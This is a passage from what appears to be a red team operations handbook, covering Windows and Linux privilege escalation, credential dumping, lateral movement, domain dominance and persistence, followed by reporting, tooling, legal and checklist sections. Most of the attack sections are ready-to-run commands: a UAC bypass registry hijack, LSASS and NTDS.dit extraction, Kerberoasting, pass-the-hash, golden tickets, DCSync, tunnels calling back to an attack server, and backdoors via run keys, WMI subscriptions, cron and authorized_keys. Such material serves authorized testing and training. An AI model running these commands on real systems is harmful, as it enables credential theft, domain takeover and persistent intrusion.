eventvwr.exe is auto-elevated and reads a registry key under HKCU for the MMC application to launch.

```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" `
  -Name "(default)" -Value "C:\Users\Public\payload.exe"
Start-Process "eventvwr.exe"
```

**Fodhelper.exe:** Similar HKCU registry hijack via ms-settings protocol handler. Persistent across many Windows 10 versions.

**UAC Bypass Detection:** Defenders look for unexpected child processes of known auto-elevating binaries and modifications to HKCU\Software\Classes during UAC bypass attempts.

### 6.5 Linux Privilege Escalation

```bash
# SUID/SGID binary enumeration
find / -perm /4000 -type f 2>/dev/null   # SUID
find / -perm /2000 -type f 2>/dev/null   # SGID

# Check GTFOBins for each found SUID binary
# Common exploitable SUID: find, vim, nano, cp, python, perl, ruby, awk, nmap, bash

# Sudo misconfiguration
sudo -l   # List allowed commands — check each against GTFOBins

# Writable cron jobs
crontab -l
cat /etc/crontab
find /etc/cron* /var/spool/cron* -writable -type f 2>/dev/null

# Linux capabilities
getcap -r / 2>/dev/null

# NFS no_root_squash
cat /etc/exports

# Kernel version check
uname -r
searchsploit "linux kernel $(uname -r | cut -d'.' -f1,2)"
```

### 6.6 Cloud Privilege Escalation

**AWS IAM Escalation (Pacu):**

```bash
python3 pacu.py
set_keys --key-alias target --access-key-id AKID --secret-access-key SECRET
run iam__privesc_scan

# Common escalation paths:
# iam:PutUserPolicy -> attach inline policy granting AdministratorAccess to self
# iam:CreatePolicyVersion -> create new version of existing policy with * permissions
# iam:PassRole + ec2:RunInstances -> launch EC2 with role that has more permissions
# lambda:CreateFunction + lambda:InvokeFunction -> create Lambda with privileged role
# sts:AssumeRole -> if trust policy allows assumption from compromised principal
```

**Azure Escalation:**
- Contributor role can assign themselves Owner via role assignment if guard controls are missing
- Automation account RunAs can be abused to execute commands as the Automation identity
- Azure Function managed identity privilege escalation paths exist in many common configurations

---

## 7. Lateral Movement & Credential Access

### 7.1 Credential Access Strategy

Credential access is typically the highest-priority post-exploitation objective. Captured credentials enable lateral movement, persistence, and domain compromise.

**LSASS Memory Acquisition:**

LSASS (Local Security Authority Subsystem Service) stores cached credential material in memory on Windows systems. Extracting this material requires SYSTEM or SeDebugPrivilege.

```bash
# Method 1: Mimikatz (most detected)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Method 2: Procdump (Microsoft-signed, but LSASS dump pattern well-known to EDR)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: comsvcs.dll MiniDump (abuses legitimate Windows component, more stealthy)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id lsass.dmp full

# Method 4: Nanodump (uses direct syscalls, avoids EDR hooks)
nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp

# Parse offline dump with pypykatz (Python alternative, no Windows dependency)
pypykatz lsa minidump lsass.dmp
```

**PPL (Protected Process Light) Bypass:**
Modern Windows systems protect LSASS as a PPL, preventing standard processes from obtaining a handle. PPL bypasses include loading vulnerable drivers (BYOVD — Bring Your Own Vulnerable Driver) that operate at kernel level.

**SAM Database Extraction:**

```cmd
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security

impacket-secretsdump -sam sam -system system -security security LOCAL
```

**NTDS.dit Extraction via VSS:**

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system

impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 7.2 Kerberoasting (T1558.003)

Request TGS tickets for service accounts (accounts with SPNs). These tickets are encrypted with the service account's password hash and can be cracked offline.

```bash
# From Linux with valid domain credentials
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.0.1 -request -outputfile hashes.txt

# From Windows with Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Offline cracking with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# Prioritize service accounts with high privilege (Domain Admin, Exchange trusted subsystem)
```

### 7.3 Pass-the-Hash & Pass-the-Ticket

**Pass-the-Hash (T1550.002):**
NTLM authentication allows authentication using only the password hash. Captured NT hashes can authenticate to any system that uses NTLM.

```bash
# impacket-wmiexec — uses WMI for execution (stealthier, no service creation)
impacket-wmiexec domain/user@target -hashes :NThash

# impacket-psexec — creates a service and executes commands (noisier)
impacket-psexec domain/user@target -hashes :NThash

# impacket-smbexec — semi-interactive shell via SMB (no binary upload required)
impacket-smbexec domain/user@target -hashes :NThash

# CrackMapExec — lateral movement at scale
crackmapexec smb 10.0.0.0/24 -u administrator -H NThash --shares
crackmapexec smb 10.0.0.0/24 -u administrator -H NThash -x "whoami"
crackmapexec smb 10.0.0.0/24 -u administrator -H NThash --sam

# evil-winrm — WinRM access with hash
evil-winrm -i target -u administrator -H NThash
```

**Pass-the-Ticket (T1550.003):**

```powershell
# Rubeus — request TGT with captured hash (overpass-the-hash)
Rubeus.exe asktgt /user:administrator /ntlm:HASH /domain:corp.local /ptt

# Rubeus — import captured .kirbi ticket
Rubeus.exe ptt /ticket:ticket.kirbi

# List current tickets
klist
```

### 7.4 Additional Credential Harvesting

**LaZagne:** Multi-platform credential recovery tool that extracts credentials from browsers, email clients, databases, wireless networks, and application credential stores.

**Cloud credential targets:**
- `~/.aws/credentials` and `~/.aws/config` — AWS access key pairs
- `~/.azure/` directory — Azure CLI cached tokens
- `~/.config/gcloud/` — GCP application default credentials
- Environment variables: AWS_ACCESS_KEY_ID, AZURE_CLIENT_SECRET, etc.
- Instance metadata service (IMDS): `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

### 7.5 Pivoting & Tunneling

**Ligolo-ng (recommended for clean routing):**

```bash
# On attack server: start agent listener
./proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host: run agent
./agent -connect ATTACK_SERVER:11601 -ignore-cert

# On attack server: add route
sudo ip route add 10.0.0.0/8 dev ligolo
# Any tool on the attack server can now reach internal network directly
```

**Chisel (HTTP-based tunnel with SOCKS5):**

```bash
# Server (attack system)
chisel server -p 8080 --reverse --socks5

# Client (compromised host)
chisel client ATTACK_SERVER:8080 R:socks

# Configure /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains impacket-wmiexec domain/user@internal-target -hashes :hash
```

**SSHuttle (VPN-over-SSH):**

```bash
sshuttle -r user@compromised-host 10.0.0.0/8 192.168.0.0/16
```

---

## 8. Domain Dominance & Persistence

### 8.1 Golden Ticket Attack

The Golden Ticket attack (T1558.001) forges a Kerberos Ticket Granting Ticket (TGT) signed by the krbtgt account's NTLM hash. A forged TGT is trusted by all systems in the domain because it appears to be legitimately issued by the domain controller.

```bash
# Step 1: Obtain krbtgt hash via DCSync (requires Domain Admin or DCSync rights)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Step 2: Forge Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_NTLM_HASH \
  /ptt

# Validate
klist
dir \\dc01\c$

# OPSEC: set realistic ticket lifetime (/endin:600 /renewmax:10080)
# Forged tickets with 10-year lifetime (old default) create anomalous Kerberos event 4769
```

**DCSync Attack (T1003.006):**
Abuse Directory Replication Service (DRS) privileges to replicate all user credentials from the domain controller without logging into the DC. Requires Replicating Directory Changes and Replicating Directory Changes All privileges.

```bash
impacket-secretsdump corp.local/administrator:'Password'@dc01.corp.local -just-dc-ntlm
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### 8.2 Domain Persistence Techniques

**AdminSDHolder Backdoor (T1078.002):**
AdminSDHolder is a special AD object whose DACL is used as a template for protected groups. The SDProp process (runs every 60 minutes) resets the ACL of all protected group members to match AdminSDHolder. Adding an attacker-controlled account to AdminSDHolder's ACL propagates that access to all protected AD objects within 60 minutes — persistently, even if manually removed from the actual groups.

```bash
# Add GenericAll permission for attacker account to AdminSDHolder
impacket-dacledit corp.local/administrator:'Password' -action write \
  -rights FullControl -principal AttackerUser \
  -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local"
```

**SID History Injection (T1134.005):**
The SIDHistory attribute allows migrated accounts to retain access from old domains. Adding a high-privileged SID (e.g., Enterprise Admins SID) to a regular account's SIDHistory grants those privileges whenever the account authenticates.

**AD CS Certificate Persistence (T1649):**
Active Directory Certificate Services misconfigurations enable attackers to enroll certificates that authenticate as privileged users indefinitely.

```bash
# Certipy — enumerate and exploit AD CS
certipy find -u user@corp.local -p password -dc-ip 10.0.0.1 -vulnerable

# ESC1: enroll certificate specifying arbitrary UPN
certipy req -u attacker@corp.local -p password -ca Corp-CA \
  -template VulnerableTemplate -upn administrator@corp.local

# Authenticate with enrolled certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### 8.3 Windows Persistence Techniques

**Registry Run Keys (T1547.001):**
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MicrosoftUpdate" /t REG_SZ /d "C:\Users\Public\implant.exe"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "SecurityHealth" /t REG_SZ /d "C:\Windows\Temp\implant.exe"
```

**Scheduled Tasks (T1053.005):**
```cmd
schtasks /create /sc ONLOGON /tn "MicrosoftEdgeUpdate" /tr "C:\ProgramData\implant.exe" /ru SYSTEM /f
schtasks /create /sc MINUTE /mo 15 /tn "WindowsDefender" /tr "C:\Windows\Temp\implant.exe" /ru SYSTEM /f
```

**WMI Event Subscription (T1546.003) — Fileless persistence:**
```powershell
$Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$Filter.Name = "UpdateFilter"
$Filter.QueryLanguage = "WQL"
$Filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Filter.EventNamespace = "root\cimv2"
$Filter.Put()

$Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$Consumer.Name = "UpdateConsumer"
$Consumer.CommandLineTemplate = "C:\Windows\Temp\implant.exe"
$Consumer.Put()

$Binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$Binding.Filter = $Filter.Path.RelativePath
$Binding.Consumer = $Consumer.Path.RelativePath
$Binding.Put()
```

**COM Hijacking (T1546.015):**
```cmd
reg add "HKCU\Software\Classes\CLSID\{TARGET_CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\malicious.dll"
reg add "HKCU\Software\Classes\CLSID\{TARGET_CLSID}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both"
```

### 8.4 Linux Persistence

```bash
# Cron (T1053.003)
(crontab -l; echo "*/5 * * * * /tmp/.hidden_payload") | crontab -

# Systemd user service
mkdir -p ~/.config/systemd/user/
# Create a service unit file targeting implant binary, then:
systemctl --user enable hidden.service

# SSH authorized_keys (T1098.004)
echo "ssh-rsa AAAA...attacker_public_key" >> ~/.ssh/authorized_keys

# LD_PRELOAD via /etc/ld.so.preload (T1574.006) — REQUIRES ROOT
echo "/tmp/.evil.so" > /etc/ld.so.preload
```

### 8.5 Cloud Persistence

**AWS Lambda Backdoor:** Create a Lambda function with malicious code that exfiltrates credentials or creates persistent admin access. Schedule via EventBridge for periodic execution.

**SSM Automation Runbook:** Create a Systems Manager Automation runbook that executes commands on EC2 instances on a schedule. Less visible than Lambda, operates via managed service.

**Azure Runbook:** Create an Azure Automation runbook that executes PowerShell against domain-joined VMs. Trigger via Automation Schedule for persistent access even if the initial foothold is removed.

---

## 9. Reporting & Purple Team Integration

### 9.1 Red Team Report Structure

The deliverable quality of a red team engagement directly determines whether findings are actioned or filed away. Reports must communicate technical findings clearly to both security practitioners and executive stakeholders.

**Executive Summary (1-2 pages):**
- Overall risk rating (Critical/High/Medium/Low or numeric 1-10) with brief justification
- Critical path narrative: "An external attacker could have obtained financial data within 72 hours without triggering any security alerts. The attack chain began with a phishing email, progressed to domain administrator access within 4 hours, and concluded with unrestricted access to the production financial database."
- Business impact statement: translate technical findings to business language (data exfiltration translates to regulatory fines and reputational damage; demonstrated ransomware capability translates to operational downtime and recovery costs)
- 3-5 prioritized recommendations with effort estimates (Quick Win, Short-term, Long-term)
- Engagement duration, scope summary, and team size

**Attack Narrative (chronological kill chain):**
Write as a story with timestamps and evidence. The narrative should be readable by a security professional who was not present during the engagement.

```
Day 1 - 09:14  Sent phishing email campaign to 47 employees in Finance department
Day 1 - 11:32  User finance.user@target.com clicked link, submitted credentials to capture page
Day 1 - 11:35  Used captured credentials against VPN portal — MFA push sent to victim phone
Day 1 - 11:38  Victim approved MFA push (push fatigue — 4th push in 3 minutes)
Day 1 - 11:40  Established VPN session. Implant deployed via PowerShell. Initial foothold confirmed.
Day 1 - 14:22  Local privilege escalation via PrintSpoofer (SeImpersonatePrivilege). SYSTEM obtained.
Day 2 - 08:15  Lateral movement to file server FS01 via Pass-the-Hash using local admin hash.
Day 2 - 10:44  Kerberoasting yielded 12 TGS tickets. svc_backup cracked offline in 22 minutes.
Day 2 - 16:30  svc_backup is Domain Admin. DCSync performed — all domain hashes obtained.
Day 3 - 09:00  Primary objective achieved: read access to production financial database confirmed.
```

**Technical Findings (one page per finding):**
- Finding Title and MITRE ATT&CK ID (e.g., "MFA Push Fatigue — T1621")
- Severity rating with CVSS or qualitative justification
- Description: what the vulnerability is and why it matters
- Evidence: screenshots, command output (redacted if sensitive), timestamps
- Detection Opportunity: what log sources and alerts should have fired but did not
- Remediation: specific, actionable steps with estimated effort (T-shirt sizing: XS/S/M/L/XL)
- References: vendor advisories, MITRE ATT&CK link, relevant tooling

**Appendices:**
- Full IOC list: C2 IP addresses, domains used, payload file hashes (SHA256), named pipes, mutex values, registry keys created, scheduled task names, user accounts created
- Tools used during engagement
- Scope confirmation (copy of signed authorization letter dates/scope)
- Methodology overview

### 9.2 MITRE ATT&CK Navigator Integration

ATT&CK Navigator allows visualization of techniques used during an engagement as a heatmap layer.

```json
{
  "name": "Q4 2024 Red Team Engagement",
  "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
  "domain": "enterprise-attack",
  "techniques": [
    {
      "techniqueID": "T1566.001",
      "tactic": "initial-access",
      "color": "#ff6666",
      "comment": "Spear phishing with credential harvest link — 3 of 47 targets clicked",
      "enabled": true
    },
    {
      "techniqueID": "T1621",
      "tactic": "credential-access",
      "color": "#ff6666",
      "comment": "MFA push fatigue — victim approved 4th consecutive push",
      "enabled": true
    }
  ]
}
```

The layer file can be imported into the ATT&CK Navigator web tool and overlaid against the blue team's detection coverage layer to immediately visualize gaps.

### 9.3 Purple Team Integration Workflow

**Standard Purple Team Loop:**

1. **Red team executes** a specific TTP (e.g., runs Mimikatz sekurlsa::logonpasswords)
2. **Notify blue team** immediately after execution via agreed communication channel ("T1003.001 executed on HOST01 at 14:22 UTC")
3. **Blue team checks** SIEM/EDR: did an alert fire? Was the event logged? Was it prioritized?
4. **Joint analysis:** If detection worked — document as "detected", move to next TTP. If detection failed — identify which log source should have captured it, determine why it did not, write or tune detection rule together.
5. **Red team re-executes** the same TTP to confirm the new detection rule fires.
6. **Document in VECTR:** create test case, record detection status, note rule that was created.
7. **Iterate** to next TTP in the exercise plan.

**VECTR Platform (vectr.io):**
Open-source (community edition) and commercial platform for red team/purple team tracking. Features:
- Engagement management and test case library
- Technique-level detection scoring (Detected/Prevented/Alerted/Logged/Missed)
- Multi-engagement trend analysis: "our detection of credential access techniques improved from 23% to 61% over 4 quarters"
- MITRE ATT&CK integration
- Report generation for leadership visibility

### 9.4 Breach & Attack Simulation (BAS) Tools

BAS platforms automate the continuous execution of attack scenarios to validate security controls without requiring a human red team.

| Platform | Differentiator |
|---|---|
| SafeBreach | Large scenario library, many threat actor playbooks, strong executive dashboard |
| AttackIQ | MITRE ATT&CK alignment, open ecosystem (AEF), strong detection content output |
| XM Cyber | Attack path simulation (graph-based), prioritizes by exposure to crown jewels |
| Picus Security | Detection analytic library, tune SIEM rules from results |
| Cymulate | Broad assessment types (BAS + phishing + vuln assessment), ease of deployment |

BAS supplements but does not replace human red teaming. BAS tools cannot adapt to novel defenses, exploit zero-days, chain unexpected vulnerabilities, or simulate social engineering.

### 9.5 Red Team Program Metrics

Metrics demonstrate red team value to leadership and enable tracking of defensive improvement over time.

**Key Metrics to Track:**
- **Detection Rate by MITRE Tactic:** What percentage of techniques in each tactic category resulted in a security alert? Target: improve quarter-over-quarter.
- **Mean Time to Detection (MTTD):** How long between TTP execution and alert firing?
- **Mean Time to Response (MTTR):** How long between alert and analyst action?
- **Mean Dwell Time:** How many days between initial access and detection in no-notice exercises?
- **Purple Team Test Coverage:** What percentage of MITRE ATT&CK techniques applicable to the organization's threat model have been tested?
- **Finding Remediation Rate:** What percentage of prior red team findings have been remediated at time of next assessment?
- **Escalation Time:** How long for an analyst to escalate a detected incident to the incident response team?

---

## 10. Red Team Tooling Reference

### 10.1 Tooling by Engagement Phase

**Reconnaissance & OSINT:**

| Tool | Purpose | Source |
|---|---|---|
| Amass | Comprehensive subdomain enumeration (passive + active) | github.com/owasp-amass/amass |
| Subfinder | Fast passive subdomain enumeration via APIs | github.com/projectdiscovery/subfinder |
| dnsx | DNS resolution and validation at scale | github.com/projectdiscovery/dnsx |
| Massdns | High-performance bulk DNS resolution | github.com/blechschmidt/massdns |
| theHarvester | Email, domain, and OSINT harvesting | github.com/laramies/theHarvester |
| Maltego | Visual OSINT link analysis | maltego.com (community edition available) |
| Shodan CLI | Internet-connected device search API | cli.shodan.io |
| Recon-ng | Web reconnaissance framework with modules | github.com/lanmaster53/recon-ng |
| trufflehog | Git secret scanning for credentials | github.com/trufflesecurity/trufflehog |
| CloudEnum | Cloud resource enumeration (AWS/Azure/GCP) | github.com/initstring/cloud_enum |
| EyeWitness | Web screenshot and service enumeration | github.com/RedSiege/EyeWitness |

**Initial Access:**

| Tool | Purpose | Source |
|---|---|---|
| GoPhish | Phishing campaign management framework | github.com/gophish/gophish |
| EvilGinx3 | AiTM phishing proxy for session token capture | github.com/kgretzky/evilginx2 |
| Modlishka | Reverse proxy phishing framework | github.com/drk1wi/Modlishka |
| SEToolkit (SET) | Social engineering toolkit | github.com/trustedsec/social-engineer-toolkit |
| Fireprox | AWS API Gateway IP rotation proxy | github.com/ustayready/fireprox |
| MSOLSpray | Microsoft 365 password spray | github.com/dafthack/MSOLSpray |
| Kerbrute | Kerberos-based user enumeration and password spray | github.com/ropnop/kerbrute |
| Metasploit | Exploit framework with initial access modules | github.com/rapid7/metasploit-framework |

**C2 Frameworks:**

| Framework | Type | Transport Options | Notable Features |
|---|---|---|---|
| Cobalt Strike | Commercial | HTTP/HTTPS/DNS/SMB | Malleable C2, BOF, mature ecosystem, team server |
| Sliver | Open Source | mTLS/WireGuard/HTTP/DNS/TCP | Multi-operator, implant generation, BOF support |
| Havoc | Open Source | HTTP/HTTPS/SMB | Demon agent, extC2, active development, modern evasion |
| Brute Ratel C4 | Commercial | HTTP/HTTPS/DNS/Slack | EDR-focused evasion, Badger agent, UDRL |
| Mythic | Open Source | Profile-based (many C2 profiles) | Modular agent/C2 architecture, web UI, plugin ecosystem |
| Covenant | Open Source | HTTP/HTTPS | .NET-based, Grunt implant, web interface |
| Metasploit | Open Source | TCP/HTTP/HTTPS | Broad exploit library, well-understood meterpreter |

**Credential Access:**

| Tool | Purpose | Notes |
|---|---|---|
| Mimikatz | Windows credential extraction (LSASS, SAM, DPAPI) | High EDR detection rate; use BOF variants in defended environments |
| Rubeus | Kerberos attack toolkit (Kerberoasting, AS-REP, Pass-the-Ticket) | C#, runs in-memory, lower detection than Mimikatz |
| pypykatz | Python implementation of Mimikatz functionality | Runs on Linux, parses offline LSASS dumps |
| Nanodump | LSASS dumping via direct syscalls | Lower EDR footprint than traditional dump methods |
| LaZagne | Multi-platform credential recovery (browsers, Wi-Fi, databases, apps) | Python/compiled, recovers many application credential stores |
| impacket-secretsdump | Remote credential extraction (SAM, NTDS, LSA secrets) | Full Python, no Windows dependency, DCSync capable |
| CrackMapExec | Network credential validation and execution at scale | SMB/WinRM/MSSQL/LDAP protocols |
| Certipy | AD CS enumeration and exploitation | Certificate-based credential compromise and persistence |

**Lateral Movement:**

| Tool | Purpose | Protocol |
|---|---|---|
| impacket-psexec | Remote code execution via service creation | SMB |
| impacket-wmiexec | Remote code execution via WMI | DCOM |
| impacket-smbexec | Remote shell without binary upload | SMB |
| evil-winrm | Full-featured WinRM shell with hash support | WinRM (5985/5986) |
| CrackMapExec | Network-wide lateral movement and enumeration | Multi-protocol |
| ligolo-ng | TUN-interface tunneling for seamless pivoting | TCP/UDP over TLS |
| chisel | Fast TCP/UDP tunnel over HTTP with SOCKS5 | HTTP |
| sshuttle | VPN-over-SSH transparent routing | SSH |
| Proxychains4 | Route arbitrary tools through SOCKS proxy | SOCKS4/5 |

**Privilege Escalation:**

| Tool | Platform | Key Checks |
|---|---|---|
| WinPEAS | Windows | Services, registry, credentials, DPAPI, scheduled tasks, token privileges |
| LinPEAS | Linux | SUID, sudo, cron, capabilities, writable paths, NFS, container escapes |
| PowerUp.ps1 | Windows | Service misconfigurations, unquoted paths, AlwaysInstallElevated |
| Seatbelt | Windows | Security configuration, situational awareness, credential material locations |
| AccessChk | Windows | Object ACL enumeration — legitimate Sysinternals binary |
| PEASS-ng | Both | Combined WinPEAS/LinPEAS suite maintained actively |

**Post-Exploitation (SharpCollection suite):**

| Tool | Purpose |
|---|---|
| Seatbelt | Situational awareness and security configuration audit |
| SharpUp | Windows privilege escalation checks (C# alternative to PowerUp) |
| SharpHound | Active Directory enumeration and graph data collection for BloodHound |
| Certify | Active Directory Certificate Services (AD CS) enumeration and exploitation |
| Rubeus | Kerberos attack and abuse toolkit |
| SharpDPAPI | DPAPI master key and credential decryption |
| SharpChrome | Chrome credential and cookie extraction |
| SharpRDP | RDP lateral movement without a graphical client |

**Evasion & Payload Development:**

| Tool | Purpose |
|---|---|
| SysWhispers3 | Direct syscall stubs for API hook bypass |
| Donut | PE/DLL/.NET to position-independent shellcode converter |
| Garble | Go binary obfuscation (identifier renaming, string encryption) |
| ThreatCheck | Identify AMSI/Defender-flagging bytes in a payload (binary search method) |
| DefenderCheck | Locate specific detection signatures in payloads |
| Invoke-Obfuscation | PowerShell obfuscation via token, AST, and encoding techniques |
| Chameleon | PowerShell script obfuscation focused on bypassing AMSI and logging |

**Wireless:**

| Tool | Purpose |
|---|---|
| aircrack-ng suite | 802.11 packet capture, injection, WPA2 handshake cracking |
| hcxdumptool | Capture PMKID and EAPOL frames for offline cracking |
| Bettercap | ARP spoofing, MITM, Wi-Fi deauth, credential capture |
| hostapd-wpe | WPA Enterprise rogue AP for credential capture (MSCHAPV2 hash capture) |
| EAPHammer | Targeted evil twin attacks against WPA2-Enterprise networks |

**Reporting & Tracking:**

| Tool | Purpose |
|---|---|
| VECTR | Red team/purple team engagement tracking, MITRE ATT&CK mapping, metrics |
| PlexTrac | Commercial penetration testing and red team reporting platform |
| Dradis Framework | Open-source collaboration and reporting for security assessments |
| Serpico | Open-source penetration test report generation (template-based) |
| ATT&CK Navigator | MITRE ATT&CK technique visualization (heatmaps, layer exports) |
| BloodHound | Active Directory attack path visualization (graph database) |

### 10.2 Legal Frameworks & Authorized Testing Requirements

**United States — Computer Fraud and Abuse Act (CFAA):**
The CFAA (18 U.S.C. § 1030) criminalizes unauthorized access to protected computers. The authorized access exception requires: written authorization from the asset owner or authorized representative (someone with legal authority to grant access rights), specific scope definition, and activities limited to the scope. Verbal authorization is insufficient. The authorization letter must predate any testing activity.

**United Kingdom — Computer Misuse Act 1990 (CMA):**
Sections 1-3 cover unauthorized access offenses. The authorized user defense requires that the access was authorized by the owner or person responsible for the computer. Written authorization is strongly recommended. UK penetration testing firms often engage through CREST accreditation to provide clients with assurance of ethical standards.

**EU — GDPR Considerations:**
Even authorized testing that captures personal data (employee credentials, customer records discovered in scope) triggers GDPR obligations. ROE documents should specify data handling requirements: encrypted storage, limited access, retention period, and deletion confirmation post-engagement.

**Penetration Testing Agreement Requirements:**
Regardless of jurisdiction, a valid authorization agreement should include:
1. Identity of authorizing party (with authority to grant access)
2. Specific systems in scope (IP ranges, domains, application names)
3. Engagement start and end dates
4. Description of authorized activities (and prohibited activities)
5. Data handling requirements
6. Incident notification procedures
7. Liability and indemnification clauses
8. Signature of authorized representative

### 10.3 Engagement Checklists

**Pre-Engagement:**
- [ ] Scope defined in writing and signed by authorized representative
- [ ] ROE document completed and approved by both parties
- [ ] GOOJ letters printed and distributed to all operators
- [ ] Emergency contacts (client-side) established and tested
- [ ] SOC deconfliction confirmed: who is "read in" and what is the out-of-band confirmation process
- [ ] Legal authorization reviewed by counsel
- [ ] Engagement infrastructure provisioned and tested (implant callbacks confirmed, redirectors operational)
- [ ] OPSEC check of all infrastructure (no personal details, sanitized metadata)
- [ ] Operator briefing: all team members have read and understood the ROE document
- [ ] Evidence collection system established (screenshots, terminal logs, timestamps)

**During Engagement:**
- [ ] All actions logged with timestamps (operator name, system targeted, action taken, result)
- [ ] Screenshots captured for all significant findings
- [ ] No actions taken outside defined scope — check scope document before proceeding with any new target
- [ ] Deconfliction channel monitored continuously during active testing
- [ ] Daily check-in with client POC during long-running engagements
- [ ] Any discovered real-world threat actor indicators immediately reported to client
- [ ] Data sensitivity respected — do not read, copy, or exfiltrate data beyond what is necessary to prove access
- [ ] If in doubt about whether an action is in scope — stop and confirm with client before proceeding

**Post-Engagement:**
- [ ] All persistence mechanisms removed (registry keys, scheduled tasks, user accounts, WMI subscriptions, SSH keys)
- [ ] All deployed tools and implant files removed from target systems
- [ ] C2 callbacks confirmed ceased
- [ ] Engagement infrastructure decommissioned or isolated
- [ ] Evidence (captured credentials, data samples) deleted per agreed handling procedures
- [ ] Final report delivered within agreed timeline
- [ ] Purple team debrief scheduled
- [ ] Post-engagement retrospective with red team to capture lessons learned

### 10.4 Training Resources & Certification Pathways

**Hands-On Practice Environments:**

| Platform | Recommended Labs | Focus |
|---|---|---|
| HackTheBox Pro Labs | Offshore (AD), RastaLabs (AV evasion), Cybernetics (enterprise), APTLabs | Enterprise red team simulation |
| TryHackMe | Advanced Active Directory, Advanced Exploitation rooms | Structured learning paths |
| PentesterLab Pro | Exploit development, web, binary exploitation | Deep technical skills |
| VulnHub | Downloadable vulnerable VMs | Offline practice |
| AttackDefense (Pentester Academy) | Browser-based lab environment with guided courses | Red team certifications |

**Relevant Certifications:**

| Certification | Issuer | Focus |
|---|---|---|
| PNPT (Practical Network Penetration Tester) | TCM Security | Practical network and AD pentesting |
| OSCP (Offensive Security Certified Professional) | OffSec | Foundational penetration testing |
| CRTO (Certified Red Team Operator) | Zero-Point Security | Cobalt Strike, red team operations |
| CRTE (Certified Red Team Expert) | Altered Security | Advanced Active Directory red teaming |
| CRTL (Certified Red Team Lead) | Zero-Point Security | Red team leadership and custom infrastructure |
| OSED (Offensive Security Exploit Developer) | OffSec | Windows exploit development |
| GXPN (GIAC Exploit Researcher and Advanced Penetration Tester) | SANS/GIAC | Advanced exploitation and research |

**Key Reading & Research Sources:**
- SpecterOps blog (posts.specterops.io) — AD security, detection, and red team research
- MDSec blog (mdsec.co.uk/category/blog) — adversary simulation, evasion, tooling
- MITRE ATT&CK (attack.mitre.org) — adversary TTP knowledge base and framework
- The C2 Matrix (thec2matrix.com) — comprehensive C2 framework comparison
- ired.team notes — practical red team technique documentation
- Sektor7 courses — malware development and evasion tradecraft

---

*This reference is maintained for authorized red team operators. Content reflects tradecraft knowledge as of the document version date. Frameworks, tool detection rates, and defensive capabilities evolve continuously — verify currency of specific techniques before use in engagements. All engagements require explicit written authorization.*